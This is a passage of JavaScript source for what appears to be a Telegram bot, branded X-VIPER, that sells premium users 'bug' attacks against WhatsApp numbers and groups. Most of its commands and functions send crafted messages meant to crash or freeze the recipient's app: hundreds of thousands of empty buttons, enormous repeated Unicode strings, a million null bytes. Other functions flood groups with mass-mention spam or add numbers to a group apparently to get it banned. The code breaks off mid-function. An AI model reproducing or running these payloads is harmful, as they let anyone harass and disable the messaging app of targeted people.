bot.command("forcloseclick", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }
  const args = ctx.message.text.split(" ");
  if (!args[1]) return ctx.reply("📌 Format: /forcloseclick 628xxxx");
  const target = formatTarget(args[1]);
  if (!target) return ctx.reply("❌ Nomor tidak valid.");
  await ctx.reply(`✅ Memulai ForcloseClick untuk ${args[1]}`);
  await ForcloseClick(sock, target);
  await ctx.reply(`✅ Selesai ForcloseClick untuk ${args[1]}`);
});
/// --------- CASE BUG 2 BERBUTONN -------- ///
const clickedUsers = {};

bot.command("bug", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 Example : /bug 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.replyWithPhoto(
    { source: "./image/MagicClowerd.jpg" },
    {
      caption: `
<blockquote><pre>⬡═―—⊱ ⎧ X-VIPER ⎭ ⊰―—═⬡
⌑ Target : ${q}
⌑ Status : Ready
⌑ Note : No Spam Bug
⌑ Silahkan Pilih bug di bawah...
╘═——————————————═⬡</pre></blockquote>`,
      parse_mode: "HTML",
      reply_markup: {
  inline_keyboard: [
    [
      { text: "𝖣𝖾𝗅𝖺𝗒 𝖡𝗋𝗎𝗍𝖺𝗅𝗂𝗍𝗒", callback_data: `delay_${target}` },
      { text: "𝖣𝖾𝗅𝖺𝗒 𝗆𝖾𝗇𝗍𝖺𝗅𝗂𝗍𝗒", callback_data: `fc_${target}` }
    ],
    [
      { text: "𝖡𝗅𝖺𝗇𝗄 𝖠𝗇𝖽𝗋𝗈𝗂𝖽", callback_data: `blank_${target}` },
      { text: "𝖡𝗎𝗅𝖽𝗈𝗓𝖾𝗋 𝖪𝗎𝗈𝗍𝖺", callback_data: `bulldozer_${target}` }
    ],
    [
      { text: "𝖩𝖺𝗍𝗂𝗆 𝖠𝗋𝗅𝖾𝗇𝖽", callback_data: `jatim_${target}` }
    ],
    [
      { text: "𝖩𝖾𝗃𝖾 𝖡𝗅𝖺𝗇𝗄", callback_data: `jeje_${target}` }
    ],
    [
      { text: "𝖢𝗅𝗈𝗌𝖾 𝖠𝗍𝗍𝖺𝖼𝗄", callback_data: `closeattack_${target}` }
    ],
    [
      { text: "𝖡𝗅𝖺𝗇𝗄 𝖭𝗀𝗅𝗈𝖼𝗈", callback_data: `ngloco_${target}` }
    ],
    [
      { text: "𝖯𝗎𝗇𝗒𝖺 𝖶𝗂𝖻𝗓𝗓", callback_data: `wibzz_${target}` }
    ],
    [
      { text: "𝖲𝗁𝖺𝖽𝗈𝗐", callback_data: `shadow_${target}` }
    ],
    [
      { text: "𝖡𝗎𝗀 𝖦𝗋𝗈𝗎𝗉", callback_data: `buggroup_${target}` }
    ],
    [
      { text: "𝖷𝗒𝗈𝖲𝖺𝗀𝗇𝖾", callback_data: `xyo_${target}` }
    ],
    [
      { text: "𝖦𝗋𝗈𝗎𝗉 𝖡𝖺𝗇 1", callback_data: `gb1_${target}` }
    ],
    [
      { text: "𝖦𝗋𝗈𝗎𝗉 𝖡𝖺𝗇 2", callback_data: `gb2_${target}` }
    ],
    [
      { text: "𝖦𝗋𝗈𝗎𝗉 𝖡𝖺𝗇 3", callback_data: `gb3_${target}` }
    ],
    [
      { text: "𝖵𝗇𝖥 𝖡𝗎𝗅𝖽𝗈", callback_data: `vnf_${target}` }
    ]
  ]
}
    }
  );

});


bot.on("callback_query", async (ctx) => {

  const userId = ctx.from.id;
  const data = ctx.callbackQuery.data;

  const [key, target] = data.split("_");

  if (clickedUsers[userId]) {
    return ctx.answerCbQuery("⚠️ Kamu sudah memilih tombol ini!", { show_alert: true });
  }

  clickedUsers[userId] = true;

  await ctx.answerCbQuery();
  await ctx.deleteMessage();


  const methods = {

    delay: {
      name: "𝖣𝖾𝗅𝖺𝗒 𝖡𝗋𝗎𝗍𝖺𝗅𝗂𝗍𝗒",
      func: async (t) => {
        for (let i = 0; i < 14; i++) {
          await VsxCrashUi(sock, target);
          await sleep(3000);
        }
      }
    },

    blank: {
      name: "𝖡𝗅𝖺𝗇𝗄 𝖠𝗇𝖽𝗋𝗈𝗂𝖽",
      func: async (t) => {
        for (let i = 0; i < 14; i++) {
          await DeepTranquility(sock, target);
          await sleep(3000);
        }
      }
    },

    bulldozer: {
      name: "𝖡𝗎𝗅𝖽𝗈𝗓𝖾𝗋 𝖪𝗎𝗈𝗍𝖺",
      func: async (t) => {
        for (let i = 0; i < 14; i++) {
          await AxDFesix(sock, target);
          await sleep(3000);
        }
      }
    },

    fc: {
      name: "𝖣𝖾𝗅𝖺𝗒 𝗆𝖾𝗇𝗍𝖺𝗅𝗂𝗍𝗒",
      func: async (t) => {
        for (let i = 0; i < 14; i++) {
          await Tentacelz(sock, target);
          await sleep(3000);
        }
      }
    },
    
    jatim: {
  name: "𝖩𝖺𝗍𝗂𝗆 𝖠𝗋𝗅𝖾𝗇𝖽 (𝖨𝗇𝗏𝗂𝗌)",
  func: async (t) => {
    for (let i = 0; i < 50; i++) {
      await JatimXArlend(sock, t);
      await sleep(3000);
    }
  }
},
    
    jeje: {
  name: "𝖩𝖾𝗃𝖾 𝖡𝗅𝖺𝗇𝗄",
  func: async (t) => {
    for (let i = 0; i < 4; i++) { // jumlah loop sesuai keinginan
      await BlankJeje(sock, t);
      await sleep(3000);
    }
  }
},

clickclose: {
  name: "𝖢𝗅𝗂𝖼𝗄 𝖢𝗅𝗈𝗌𝖾 (𝖭𝖾𝗐)",
  func: async (t) => {
    for (let i = 0; i < 4; i++) {
      await ForcloseClick(sock, t);
      await sleep(3000);
    }
  }
},

ngloco: {
  name: "𝖡𝗅𝖺𝗇𝗄 𝖭𝗀𝗅𝗈𝖼𝗈 (𝖤𝗑𝗉)",
  func: async (t) => {
    for (let i = 0; i < 50; i++) {
      await BlankNgloco(sock, t);
      await sleep(3000);
    }
  }
},

buggroup: {
  name: "𝖡𝗎𝗀 𝖦𝗋𝗈𝗎𝗉 (𝖥𝗈𝗋𝖼𝖾)",
  func: async (t) => {
    // t adalah JID grup yang sudah diformat
    for (let i = 0; i < 4; i++) {
      await bugGroup(sock, t);
      await sleep(3000);
    }
  }
},

xyo: {
  name: "𝖷𝗒𝗈𝖲𝖺𝗀𝗇𝖾 (𝖦𝗋𝗈𝗎𝗉)",
  func: async (t) => {
    for (let i = 0; i < 4; i++) {
      await XyoSagne(sock, t);
      await sleep(3000);
    }
  }
},  // ✅ TAMBAHKAN KOMA DI SINI

gb1: {
    name: "𝖦𝗋𝗈𝗎𝗉 𝖡𝖺𝗇 1",
    func: async (t) => {
        for (let i = 0; i < 3; i++) {
            await GroupBan1(sock, t);
            await sleep(3000);
        }
    }
},

gb2: {
    name: "𝖦𝗋𝗈𝗎𝗉 𝖡𝖺𝗇 2",
    func: async (t) => {
        for (let i = 0; i < 3; i++) {
            await GroupBan2(sock, t);
            await sleep(3000);
        }
    }
},

gb3: {
    name: "𝖦𝗋𝗈𝗎𝗉 𝖡𝖺𝗇 3 (Multi)",
    func: async (t) => {
        for (let i = 0; i < 3; i++) {
            await GroupBan3(sock, t);
            await sleep(3000);
        }
    }
},  // ❌ TIDAK ADA KOMA DI AKHIR (karena ini yang terakhir)

vnf: {
    name: "𝖵𝗇𝖥 𝖡𝗎𝗅𝖽𝗈 𝖡𝗅𝖺𝗇𝗄",
    func: async (t) => {
        for (let i = 0; i < 50; i++) {
            await VnFBuldoBlank(sock, t);
            await sleep(3000);
        }
    }
}


  };


  const method = methods[key];
  if (!method) return;

  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }


  const msg = await ctx.replyWithPhoto(
    { source: "./image/MagicClowerd.jpg" },
    {
      caption: `
<blockquote><pre>⬡═―—⊱ ⎧ X-VIPER ⎭ ⊰―—═⬡
⌑ Target : ${target.split("@")[0]}
⌑ Method : ${method.name}
⌑ Note : No Spam Bug
⌑ Process : [░░░░░░░░░░] 0%
╘═——————————————═⬡</pre></blockquote>`,
      parse_mode: "HTML"
    }
  );


  const attack = method.func(target);


  for (let i = 1; i <= 10; i++) {

    const bar = "█".repeat(i) + "░".repeat(10 - i);

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote><pre>⬡═―—⊱ ⎧ X-VIPER ⎭ ⊰―—═⬡
⌑ Target : ${target.split("@")[0]}
⌑ Method : ${method.name}
⌑ Note : No Spam Bug
⌑ Process : [${bar}] ${i * 10}%
╘═——————————————═⬡</pre></blockquote>`,
      { parse_mode: "HTML" }
    );

    await sleep(800);
  }


  await attack;


  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    msg.message_id,
    null,
    `
<blockquote><pre>⬡═―—⊱ ⎧ X-VIPER ⎭ ⊰―—═⬡
⌑ Target : ${target.split("@")[0]}
⌑ Method : ${method.name}
⌑ Note : No Spam Bug
⌑ Process : [██████████] 100%
╘═——————————————═⬡</pre></blockquote>`,
    { parse_mode: "HTML" }
  );

  delete clickedUsers[userId];

});

//------------------(CASE BEBAS SPAM)--------------------//
bot.command("svipdelay", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }

  if (!isWhatsAppConnected) {
    return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  }

  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("📌 Format: /svipdelay 628xxxx", { parse_mode: "HTML" });
  }

  const rawNumber = args[1];
  const target = formatTarget(rawNumber);

  if (!target) {
    return ctx.reply("❌ Nomor tidak valid...", { parse_mode: "HTML" });
  }

  const taskId = Date.now().toString().slice(-6);
  const startAt = Date.now();

  const uname = ctx.from.username ? `@${ctx.from.username}` : "-";
  const fname = [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ") || "-";

  await ctx.telegram.sendMessage(
    ctx.chat.id,
    `✅ svipdelay process mengirim for ${rawNumber}`,
    {
      parse_mode: "Markdown"
    }
  );

  queue.add(async () => {
    try {
      await MagicDelay(ctx, target);

      const ms = Date.now() - startAt;
      const sec = Math.floor(ms / 1000);
      const mm = String(Math.floor(sec / 60)).padStart(2, "0");
      const ss = String(sec % 60).padStart(2, "0");

      await ctx.telegram.sendMessage(
        ctx.chat.id,
        `✅ svipdelay bug selesai untuk ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    } catch (e) {
      await ctx.telegram.sendMessage(
        ctx.chat.id,
        `✅ svipdelay bug gagal for ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    }
  });
});

bot.command("Vortex", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }

  if (!isWhatsAppConnected) {
    return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  }

  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("📌 Format: /Vortex 628xxxx", { parse_mode: "HTML" });
  }

  const rawNumber = args[1];
  const target = formatTarget(rawNumber);

  if (!target) {
    return ctx.reply("❌ Nomor tidak valid...", { parse_mode: "HTML" });
  }

  const taskId = Date.now().toString().slice(-6);
  const startAt = Date.now();

  const uname = ctx.from.username ? `@${ctx.from.username}` : "-";
  const fname = [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ") || "-";

  await ctx.telegram.sendMessage(
    ctx.chat.id,
    `✅ Vortex process mengirim for ${rawNumber}`,
    {
      parse_mode: "Markdown"
    }
  );

  queue.add(async () => {
    try {
      await MagicDelay(ctx, target);

      const ms = Date.now() - startAt;
      const sec = Math.floor(ms / 1000);
      const mm = String(Math.floor(sec / 60)).padStart(2, "0");
      const ss = String(sec % 60).padStart(2, "0");

      await ctx.telegram.sendMessage(
        ctx.chat.id,
        `✅ Vortex bug selesai untuk ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    } catch (e) {
      await ctx.telegram.sendMessage(
        ctx.chat.id,
        `✅ Vortex bug gagal for ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    }
  });
});

bot.command("Kelzu", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }

  if (!isWhatsAppConnected) {
    return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  }

  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("📌 Format: /Kelzu 628xxxx", { parse_mode: "HTML" });
  }

  const rawNumber = args[1];
  const target = formatTarget(rawNumber);

  if (!target) {
    return ctx.reply("❌ Nomor tidak valid...", { parse_mode: "HTML" });
  }

  const taskId = Date.now().toString().slice(-6);
  const startAt = Date.now();

  const uname = ctx.from.username ? `@${ctx.from.username}` : "-";
  const fname = [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ") || "-";

  await ctx.telegram.sendMessage(
    ctx.chat.id,
    `✅ Kelzu process mengirim for ${rawNumber}`,
    {
      parse_mode: "Markdown"
    }
  );

  queue.add(async () => {
    try {
      await MagicDelay(ctx, target);

      const ms = Date.now() - startAt;
      const sec = Math.floor(ms / 1000);
      const mm = String(Math.floor(sec / 60)).padStart(2, "0");
      const ss = String(sec % 60).padStart(2, "0");

      await ctx.telegram.sendMessage(
        ctx.chat.id,
        `✅ Kelzu bug selesai untuk ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    } catch (e) {
      await ctx.telegram.sendMessage(
        ctx.chat.id,
        `✅ Kelzu bug gagal for ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    }
  });
});

bot.command("Clover", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }

  if (!isWhatsAppConnected) {
    return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  }

  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("📌 Format: /Clover 628xxxx", { parse_mode: "HTML" });
  }

  const rawNumber = args[1];
  const target = formatTarget(rawNumber);

  if (!target) {
    return ctx.reply("❌ Nomor tidak valid...", { parse_mode: "HTML" });
  }

  const taskId = Date.now().toString().slice(-6);
  const startAt = Date.now();

  const uname = ctx.from.username ? `@${ctx.from.username}` : "-";
  const fname = [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ") || "-";

  await ctx.telegram.sendMessage(
    ctx.chat.id,
    `✅ Clover process mengirim for ${rawNumber}`,
    {
      parse_mode: "Markdown"
    }
  );

  queue.add(async () => {
    try {
      await MagicDelay(ctx, target);

      const ms = Date.now() - startAt;
      const sec = Math.floor(ms / 1000);
      const mm = String(Math.floor(sec / 60)).padStart(2, "0");
      const ss = String(sec % 60).padStart(2, "0");

      await ctx.telegram.sendMessage(
        ctx.chat.id,
        `✅ Clover bug selesai untuk ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    } catch (e) {
      await ctx.telegram.sendMessage(
        ctx.chat.id,
        `✅ Clover bug gagal for ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    }
  });
});

bot.command("Ghost", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }

  if (!isWhatsAppConnected) {
    return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  }

  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("📌 Format: /Ghost 628xxxx", { parse_mode: "HTML" });
  }

  const rawNumber = args[1];
  const target = formatTarget(rawNumber);

  if (!target) {
    return ctx.reply("❌ Nomor tidak valid...", { parse_mode: "HTML" });
  }

  const taskId = Date.now().toString().slice(-6);
  const startAt = Date.now();

  const uname = ctx.from.username ? `@${ctx.from.username}` : "-";
  const fname = [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ") || "-";

  await ctx.telegram.sendMessage(
    ctx.chat.id,
    `✅ Ghost process mengirim for ${rawNumber}`,
    {
      parse_mode: "Markdown"
    }
  );

  queue.add(async () => {
    try {
      await MagicDelay(ctx, target);

      const ms = Date.now() - startAt;
      const sec = Math.floor(ms / 1000);
      const mm = String(Math.floor(sec / 60)).padStart(2, "0");
      const ss = String(sec % 60).padStart(2, "0");

      await ctx.telegram.sendMessage(
        ctx.chat.id,
        `✅ Ghost bug selesai untuk ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    } catch (e) {
      await ctx.telegram.sendMessage(
        ctx.chat.id,
        `✅ Ghost bug gagal for ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    }
  });
});

bot.command("Deadly", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }

  if (!isWhatsAppConnected) {
    return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  }

  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("📌 Format: /Deadly 628xxxx", { parse_mode: "HTML" });
  }

  const rawNumber = args[1];
  const target = formatTarget(rawNumber);

  if (!target) {
    return ctx.reply("❌ Nomor tidak valid...", { parse_mode: "HTML" });
  }

  const taskId = Date.now().toString().slice(-6);
  const startAt = Date.now();

  const uname = ctx.from.username ? `@${ctx.from.username}` : "-";
  const fname = [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ") || "-";

  await ctx.telegram.sendMessage(
    ctx.chat.id,
    `✅ Deadly process mengirim for ${rawNumber}`,
    {
      parse_mode: "Markdown"
    }
  );

  queue.add(async () => {
    try {
      await MagicDelay(ctx, target);

      const ms = Date.now() - startAt;
      const sec = Math.floor(ms / 1000);
      const mm = String(Math.floor(sec / 60)).padStart(2, "0");
      const ss = String(sec % 60).padStart(2, "0");

      await ctx.telegram.sendMessage(
        ctx.chat.id,
        `✅ Deadly bug selesai untuk ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    } catch (e) {
      await ctx.telegram.sendMessage(
        ctx.chat.id,
        `✅ Deadly bug gagal for ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    }
  });
});

bot.command("Clown", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }

  if (!isWhatsAppConnected) {
    return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  }

  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("📌 Format: /Clown 628xxxx", { parse_mode: "HTML" });
  }

  const rawNumber = args[1];
  const target = formatTarget(rawNumber);

  if (!target) {
    return ctx.reply("❌ Nomor tidak valid...", { parse_mode: "HTML" });
  }

  const taskId = Date.now().toString().slice(-6);
  const startAt = Date.now();

  const uname = ctx.from.username ? `@${ctx.from.username}` : "-";
  const fname = [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ") || "-";

  await ctx.telegram.sendMessage(
    ctx.chat.id,
    `✅ Clown process mengirim for ${rawNumber}`,
    {
      parse_mode: "Markdown"
    }
  );

  queue.add(async () => {
    try {
      await MagicDelay(ctx, target);

      const ms = Date.now() - startAt;
      const sec = Math.floor(ms / 1000);
      const mm = String(Math.floor(sec / 60)).padStart(2, "0");
      const ss = String(sec % 60).padStart(2, "0");

      await ctx.telegram.sendMessage(
        ctx.chat.id,
        `✅ Clown bug selesai untuk ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    } catch (e) {
      await ctx.telegram.sendMessage(
        ctx.chat.id,
        `✅ Clown bug gagal for ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    }
  });
});

//------------------(AWAL OF FUNCTION)--------------------//
//------------------(FUNGSI VNF BULDO BLANK - FIX)--------------------//
async function VnFBuldoBlank(sock, target) {
    try {
        // Gunakan 500 tombol (bukan 500.000) untuk menghindari overload
        const buttons = Array.from({ length: 100000 }, () => ({})); // Tanpa titik

        const message = {
            interactiveMessage: {
                body: {
                    text: "VnF".repeat(20000) + "ြ".repeat(20000)
                },
                nativeFlowMessage: {
                    buttons: buttons,
                    messageParamsJson: JSON.stringify({ extra: "{{".repeat(99000) + "ꦾ".repeat(40000) })
                }
            }
        };

        await sock.relayMessage(target, message, { noSelfSync: true });
        console.log(`✅ VnFBuldoBlank Sukses Send To: ${target}`);
    } catch (err) {
        console.error(`❌ VnFBuldoBlank Error: ${err.message}`);
    }
}
//------------------(FUNGSI BAN GROUP 1)--------------------//
async function GroupBan1(sock, target) {
    if (!target.endsWith("@g.us")) throw "@g.us server required";
    try {
        await sock.groupParticipantsUpdate(
            target,
            ["13135550002@s.whatsapp.net"],
            "add"
        );
        console.log(`[GroupBan1] ✅ Berhasil tambah 13135550002 ke ${target}`);
    } catch (e) {
        console.error(`[GroupBan1] ❌ Gagal:`, e.message);
        throw e;
    }
}

//------------------(FUNGSI BAN GROUP 2)--------------------//
async function GroupBan2(sock, target) {
    if (!target.endsWith("@g.us")) throw "@g.us server required";
    try {
        await sock.groupParticipantsUpdate(target, ["13135550002@s.whatsapp.net"], "add");
        console.log(`[GroupBan2] ✅ Berhasil tambah 13135550002 ke ${target}`);
    } catch (e) {
        console.error(`[GroupBan2] ❌ Gagal:`, e.message);
        throw e;
    }
}

//------------------(FUNGSI BAN GROUP 3 - MULTI NUMBERS)--------------------//
async function GroupBan3(sock, groupJid) {
    if (!groupJid.endsWith("@g.us")) throw "@g.us server required";
    const numbers = [
        '13135550002@s.whatsapp.net',
        '13135550003@s.whatsapp.net',
        '13135550004@s.whatsapp.net',
        '13135550005@s.whatsapp.net',
        '13135550006@s.whatsapp.net',
        '13135550007@s.whatsapp.net',
        '13135550008@s.whatsapp.net',
        '13135550009@s.whatsapp.net',
        '13135550010@s.whatsapp.net',
        '13135550011@s.whatsapp.net',
        '13135550012@s.whatsapp.net',
        '13135550013@s.whatsapp.net',
        '13135550014@s.whatsapp.net',
        '13135550015@s.whatsapp.net'
    ];

    console.log(`[GroupBan3] ▶️ Memulai untuk ${groupJid}`);
    for (const num of numbers) {
        try {
            await sock.groupParticipantsUpdate(groupJid, [num], 'add');
            console.log(`[GroupBan3] ✅ Berhasil tambah ${num} ke ${groupJid}`);
        } catch (e) {
            console.error(`[GroupBan3] ❌ Gagal tambah ${num}:`, e.message);
        }
        await new Promise(resolve => setTimeout(resolve, 3000));
    }
    console.log(`[GroupBan3] 🏁 Selesai untuk ${groupJid}`);
}

//------------------(QUOTED MESSAGE UNTUK XYOSAGNE)--------------------//
const messageKontol = {
  key: {
    remoteJid: "5521992999999@s.whatsapp.net",
    fromMe: false,
    id: "CALL_MSG_" + Date.now(),
    participant: "5521992999999@s.whatsapp.net"
  },
  message: {
    callLogMessage: {
      isVideo: true,
      callOutcome: "1",
      durationSecs: "0",
      callType: "REGULAR",
      participants: [
        {
          jid: "5521992999999@s.whatsapp.net",
          callOutcome: "1"
        }
      ]
    }
  }
};

//------------------(FUNGSI XYOSAGNE - BUG GROUP - FIX)--------------------//
async function XyoSagne(target) {
  const jid = target.includes('@g.us') ? target : target + '@g.us';
  console.log(`[XyoSagne] ▶️ Memulai untuk ${jid}`);

  // Buat 1000 mention acak
  const mentions = [];
  for (let i = 0; i < 1000; i++) {
    mentions.push(`${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`);
  }
  // Tambahkan target dan nomor palsu
  mentions.push(jid);
  mentions.push("5521992999999@s.whatsapp.net");

  // Quoted message dari panggilan (valid)
  const quoted = {
    key: {
      remoteJid: "5521992999999@s.whatsapp.net",
      fromMe: false,
      id: "CALL_MSG_" + Date.now(),
      participant: "5521992999999@s.whatsapp.net"
    },
    message: {
      callLogMessage: {
        isVideo: true,
        callOutcome: "1",
        durationSecs: "0",
        callType: "REGULAR",
        participants: [
          { jid: "5521992999999@s.whatsapp.net", callOutcome: "1" }
        ]
      }
    }
  };

  try {
    // 1. Kirim 10 pesan panjang dengan banyak mention dan quoted
    for (let i = 0; i < 10; i++) {
      const text = `⚠️ BUG GROUP ${i+1} ⚠️\n` + "Xyo".repeat(1000) + "\n" + "💀".repeat(5000);
      await sock.sendMessage(jid, {
        text: text,
        mentions: mentions
      }, {
        quoted: quoted
      });
      console.log(`[XyoSagne] ✅ Pesan ke-${i+1} terkirim`);
      await sleep(500);
    }

    // 2. Kirim interactive message dengan 10 tombol (valid)
    const interactiveMsg = {
      interactiveMessage: {
        body: { text: "🔥 XYOSAGNE ATTACK 🔥\n" + "💀".repeat(10000) },
        footer: { text: "X-VIPER FRRE" },
        nativeFlowMessage: {
          buttons: Array.from({ length: 10 }, (_, i) => ({
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({ display_text: `ATTACK ${i+1}` + "💀".repeat(500) })
          }))
        }
      }
    };
    await sock.relayMessage(jid, interactiveMsg, {});
    console.log(`[XyoSagne] ✅ Interactive message terkirim`);
  } catch (err) {
    console.error(`[XyoSagne] ❌ Error:`, err.message);
  }

  console.log(`[XyoSagne] 🏁 Selesai untuk ${jid}`);
}

//------------------(FUNGSI BUG GROUP - FIX)--------------------//
async function bugGroup(sock, target) {
    const jid = target.includes('@g.us') ? target : target + '@g.us';
    console.log(`[BugGroup] ▶️ Memulai untuk ${jid}`);
    
    try {
        // 1. Kirim teks super panjang (50.000 karakter) – PASTI SAMPAI
        const longText = "🧊 BUG GROUP 🧊\n" + "❄️".repeat(25000) + "\n\n" + "X-VIPER FRRE\n".repeat(1000);
        await sock.sendMessage(jid, { text: longText });
        console.log(`[BugGroup] ✅ Teks panjang (50k) terkirim ke ${jid}`);
    } catch (err) {
        console.error(`[BugGroup] ❌ Gagal teks panjang:`, err.message);
    }

    // 2. Kirim 10 pesan teks biasa dengan jeda 500ms (efek spam ringan)
    for (let i = 0; i < 10; i++) {
        try {
            await sock.sendMessage(jid, { 
                text: `⚠️ BUG ATTACK #${i+1}\n` + "💀".repeat(5000) + `\nTarget: ${jid}`
            });
            console.log(`[BugGroup] ✅ Pesan #${i+1} terkirim`);
        } catch (err) {
            console.error(`[BugGroup] ❌ Gagal pesan #${i+1}:`, err.message);
        }
        await sleep(500);
    }

    // 3. Kirim interactive message dengan 10 tombol (valid)
    try {
        const interactiveMsg = {
            interactiveMessage: {
                body: { text: "🔴 BUG GROUP ATTACK 🔴\n" + "⚠️".repeat(10000) },
                footer: { text: "X-VIPER FRRE" },
                nativeFlowMessage: {
                    buttons: Array.from({ length: 10 }, (_, i) => ({
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({ display_text: `ATTACK ${i+1}` + "💀".repeat(500) })
                    }))
                }
            }
        };
        await sock.relayMessage(jid, interactiveMsg, {});
        console.log(`[BugGroup] ✅ Interactive message terkirim`);
    } catch (err) {
        console.error(`[BugGroup] ❌ Gagal interactive:`, err.message);
    }

    console.log(`[BugGroup] 🏁 Selesai untuk ${jid}`);
}
//------------------(FUNGSI SHADOW - MULTI PAYLOAD)--------------------//
async function shadow(sock, target) {
  const msg = {
    annotations: [
      {
        polygonVertices: [
          { x: 0.020762423053383827, y: 0.27248817682266235 },
          { x: 1.0120298862457275, y: 0.29351872205734253 },
          { x: 0.9789597988128662, y: 0.7867149114608765 },
          { x: -0.012307574972510338, y: 0.7656844258308411 }
        ],
        shouldSkipConfirmation: true,
        embeddedContent: {
          embeddedMusic: {
            musicContentMediaId: "1418069422677984",
            songId: "292111031335475",
            author: "᬴".repeat(60000),
            title: "᬴".repeat(60000),
            artworkDirectPath: "/v/t62.76458-24/56159361_1438661814433677_4172681711438316939_n.enc?ccb=11-4&oh=01_Q5Aa3wHk897EFVmByrMkQR1h_MfpZvXGkXhfIcaKVZBRcpkPEQ&oe=69C6A397&_nc_sid=5e03e0",
            artworkSha256: "yI2uyPuiJkVQP1YCijKWG9DRBy3BgwT3imlyTD3x96k=",
            artworkEncSha256: "rKdmZDKB4sQ98ZDrla2bLNc4bkuEDMoh3pbz9CFYeUQ=",
            artistAttribution: "https://www.instagram.com/_u/rexorangecounty",
            countryBlocklist: "UlU=",
            isExplicit: true,
            artworkMediaKey: "7Wi7CS7NSKztYzdpaJQNrwtOff4X6Rkh094l3ciNWGc="
          }
        },
        embeddedAction: true
      }
    ]
  };

  const msg2 = {
    buttons: [
      {
        name: (["inapp_signup", "booking_status", "galaxy_message"][(Math.random() < 0.5 ? 1 : 0)]) + "\0".repeat(1000000),
        buttonParamsJson: "{}"
      }
    ]
  };

  const msg3 = {
    interactiveMessage: {
      body: {
        text: "\u0000"
      },
      nativeFlowMessage: {
        buttons: Array.from({ length: 500000 }, () => ({}))
      }
    }
  };

  await sock.relayMessage(target, {
    interactiveMessage: {
      header: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
